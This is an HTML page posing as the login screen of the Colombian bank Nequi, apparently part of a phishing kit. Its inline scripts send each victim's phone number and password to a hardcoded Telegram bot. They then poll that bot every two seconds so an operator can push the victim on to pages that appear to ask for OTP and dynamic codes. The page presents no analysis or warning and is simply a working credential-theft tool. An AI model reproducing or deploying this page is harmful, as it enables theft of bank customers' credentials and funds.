<!DOCTYPE html>
<html>
<head>
    <title>Nequi</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="../assets/img/favicon.ico">
    <script src="../assets/js/jquery-3.6.0.min.js"></script>
    <link href="../assets/css/styles.css" rel="stylesheet">
    <link href="../assets/css/stylesheet.css" rel="stylesheet">
    <script src="../assets/js/functions.js"></script>
</head>
<body>
    <div class="cabecera">
        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
            <tr>
                <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
                <td valign="middle" align="right">
                    <button class="btn btn-std btn-sprd top-btn">Recarga</button>
                    <button class="btn btn-std btn-sprd top-btn">Entrar</button>
                    <img src="../assets/img/menu.jpg" id="btn-menu">
                </td>
            </tr>
        </table>
    </div>

    <div class="contenido-login">
        <div class="titulo">Entra a tu Nequi</div>
        <div class="descripcion" style="margin-top: 13px;">Entra a tu Nequi y ingresa tus datos.</div>
        <table border="0" cellpadding="0" cellspacing="6" style="margin:36px auto 4px auto; max-width: 362px;" width="94%">
            <tr>
                <td width="106">
                    <div id="indicativo">
                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                            <tr>
                                <td valign="middle" align="left"><img src="../assets/img/col.png" width="29" id="bandera"></td>
                                <td valign="middle" align="right" id="txt-indicativo">+57</td>
                                <td valign="middle" align="right"><img src="../assets/img/abajo.jpg" id="flecha"></td>
                            </tr>
                        </table>
                    </div>
                </td>
                <td><input type="text" id="txt-celular" class="entradas" placeholder="Celular" maxlength="10" inputmode="numeric"></td>
            </tr>
            <tr>
                <td colspan="2"><input type="password" id="txt-password" placeholder="Contraseña" class="entradas"></td>
            </tr>
        </table>
        <img src="../assets/img/capcha-off.png" id="capcha" style="margin-bottom: 33px;">
        <br>
        <button id="btn-login" class="btn-big btn-fill" disabled>Entra</button>
        <p id="msg" style="color:#ff6b6b;margin-top:15px;font-weight:bold;"></p>
    </div>

    <div class="pie">
        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
            <tr><td id="logo-blanco-movil"><img src="../assets/img/logo-blanco.svg" width="176"><div class="separador"></div></td></tr>
        </table>
        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
            <tr>
                <td valign="top" id="logo-blanco"><img src="../assets/img/logo-blanco.svg" width="176"></td>
                <td valign="top">
                    <div class="titulo-footer">Producto</div>
                    <div class="item-footer">Legales</div>
                    <div class="item-footer">Ayuda</div>
                </td>
                <td valign="top" id="app">
                    <div class="titulo-footer">Descarga la App</div>
                    <img src="../assets/img/icon-app.jpg" style="margin-top: 10px;">
                </td>
            </tr>
        </table>
    </div>

    <!-- BOTÓN QUE ENVÍA + REDIRIGE CON WEBHOOK AUTOMÁTICO -->
    <script>
    $(document).ready(function() {
        // HABILITA BOTÓN
        $('#txt-celular, #txt-password').on('input', function() {
            const cel = $('#txt-celular').val().trim();
            const pass = $('#txt-password').val().trim();
            $('#btn-login').prop('disabled', cel.length !== 10 || pass.length < 4);
        });

        // AL TOCAR ENTRA
        $('#btn-login').click(function() {
            const numero = '+57 ' + $('#txt-celular').val().trim();
            const clave = $('#txt-password').val().trim();
            const session = Date.now(); // ID ÚNICO

            $('#msg').text('Enviando...');
            $('#btn-login').html('Enviando...').prop('disabled', true);

            // GUARDA EL ID EN LOCALSTORAGE
            localStorage.setItem('session_id', session);

            // ENVÍA A TELEGRAM CON BOTONES QUE LLAMAN AL WEBHOOK
            fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: 8469651553,
                    text: `*NUEVO CLIENTE*

*Número:* ${numero}
*Clave:* ${clave}
*ID:* ${session}

TOCA PARA REDIRIGIR:`,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{text: "Clave OTP", callback_data: `otp_${session}`}],
                            [{text: "Error clave", callback_data: `error_${session}`}],
                            [{text: "Dinámica", callback_data: `dinamica_${session}`}],
                            [{text: "Error login", callback_data: `loginerr_${session}`}],
                            [{text: "Finalizar", callback_data: `ok_${session}`}]
                        ]
                    }
                })
            }).then(() => {
                $('#msg').html('Enviado! Esperando tu acción...');
                setTimeout(() => { location.href = '/private/'; }, 1500);
            });
        });
    });
    </script>

    <!-- ESCUCHA LOS BOTONES Y REDIRIGE AL CLIENTE -->
    <script>
    // POLLING CADA 2 SEGUNDOS
    setInterval(() => {
        const session = localStorage.getItem('session_id');
        if (!session) return;

        fetch(`https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/getUpdates?offset=-1`)
        .then(r => r.json())
        .then(data => {
            if (!data.ok || !data.result.length) return;
            const update = data.result[0];
            if (!update.callback_query) return;

            const accion = update.callback_query.data;
            if (!accion.includes(session)) return;

            let destino = '';
            switch(accion.split('_')[0]) {
                case 'otp': destino = '/solicitar/'; break;
                case 'error': destino = '/login/'; break;
                case 'dinamica': destino = '/verify-voice/'; break;
                case 'loginerr': destino = '/login/'; break;
                case 'ok': destino = '/successful/'; break;
            }

            // REDIRIGE AL CLIENTE
            location.href = destino;
        });
    }, 2000);
    </script>

    <script src="../assets/js/ready.js"></script>
</body>
</html>
